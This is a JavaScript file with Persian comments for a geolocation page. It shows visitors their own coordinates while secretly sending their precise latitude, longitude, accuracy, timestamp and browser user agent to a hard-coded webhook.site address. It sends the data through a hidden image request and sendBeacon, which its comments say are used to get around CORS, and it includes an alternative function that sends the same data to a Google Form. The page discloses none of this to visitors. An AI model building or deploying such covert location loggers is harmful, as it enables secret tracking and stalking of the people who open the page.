// وب‌هوک URL - این را با آدرس وب‌هوک خودتان جایگزین کنید
const WEBHOOK_URL = "https://webhook.site/8bf7f99e-1ab5-4d2c-9820-ba84316a2bec";

function getLocation() {
    const status = document.getElementById('status');
    const coordinates = document.getElementById('coordinates');
    const mapLink = document.getElementById('mapLink');
    
    status.textContent = "در حال دریافت موقعیت...";
    
    if (!navigator.geolocation) {
        status.textContent = "مرورگر شما از موقعیت‌یابی پشتیبانی نمی‌کند";
        return;
    }

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            // نمایش به کاربر
            document.getElementById('lat').textContent = `عرض جغرافیایی: ${lat.toFixed(8)}`;
            document.getElementById('lng').textContent = `طول جغرافیایی: ${lng.toFixed(8)}`;
            document.getElementById('accuracy').textContent = `دقت: ${accuracy.toFixed(1)} متر`;
            
            const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}&z=18`;
            document.getElementById('googleMapLink').href = googleMapsUrl;
            document.getElementById('googleMapLink').textContent = `مشاهده موقعیت (${lat.toFixed(6)}, ${lng.toFixed(6)})`;
            
            coordinates.style.display = 'block';
            mapLink.style.display = 'block';
            status.textContent = "موقعیت با موفقیت دریافت شد!";
            
            // ذخیره در localStorage
            localStorage.setItem('lastLocation', JSON.stringify({
                lat: lat,
                lng: lng,
                time: new Date().toISOString()
            }));
            
            // ارسال به وب‌هوک با روش جدید
            sendToWebhook(lat, lng, accuracy);
        },
        (error) => {
            let errorMessage;
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = "❌ کاربر اجازه دسترسی نداد";
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = "❌ اطلاعات موقعیت در دسترس نیست";
                    break;
                case error.TIMEOUT:
                    errorMessage = "⏰ دریافت موقعیت زمان‌بر شد";
                    break;
                default:
                    errorMessage = "❌ خطای ناشناخته";
            }
            status.textContent = errorMessage;
        },
        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }
    );
}

// تابع جدید برای ارسال به وب‌هوک بدون CORS
function sendToWebhook(lat, lng, accuracy) {
    // استفاده از Image object برای دور زدن CORS
    const data = {
        latitude: lat,
        longitude: lng,
        accuracy: accuracy,
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent,
        map_url: `https://www.google.com/maps?q=${lat},${lng}&z=16`
    };
    
    // تبدیل داده به query string
    const queryString = Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
    
    // ارسال با استفاده از Image object (بدون CORS)
    const img = new Image();
    img.src = WEBHOOK_URL + '?' + queryString;
    img.style.display = 'none';
    
    // یا استفاده از navigator.sendBeacon
    if (navigator.sendBeacon) {
        const blob = new Blob([queryString], { type: 'application/x-www-form-urlencoded' });
        navigator.sendBeacon(WEBHOOK_URL, blob);
    }
    
    console.log('📡 داده‌ها ارسال شدند:', data);
}

// روش جایگزین: استفاده از Google Forms
function sendViaGoogleForms(lat, lng, accuracy) {
    // ابتدا یک Google Form بسازید و این URL را بگیرید
    const GOOGLE_FORM_URL = "https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse";
    
    const formData = new FormData();
    formData.append('entry.123456789', lat); // جایگزین با ID فیلدهای شما
    formData.append('entry.987654321', lng);
    formData.append('entry.111111111', accuracy);
    formData.append('entry.222222222', new Date().toISOString());
    
    fetch(GOOGLE_FORM_URL, {
        method: 'POST',
        body: formData,
        mode: 'no-cors'
    });
}

// بارگذاری آخرین موقعیت ذخیره شده
function loadLastLocation() {
    const saved = localStorage.getItem('lastLocation');
    if (saved) {
        const location = JSON.parse(saved);
        document.getElementById('lat').textContent = `عرض جغرافیایی: ${location.lat.toFixed(8)}`;
        document.getElementById('lng').textContent = `طول جغرافیایی: ${location.lng.toFixed(8)}`;
        document.getElementById('coordinates').style.display = 'block';
    }
}

// اجرا هنگام بارگذاری صفحه
window.onload = loadLastLocation;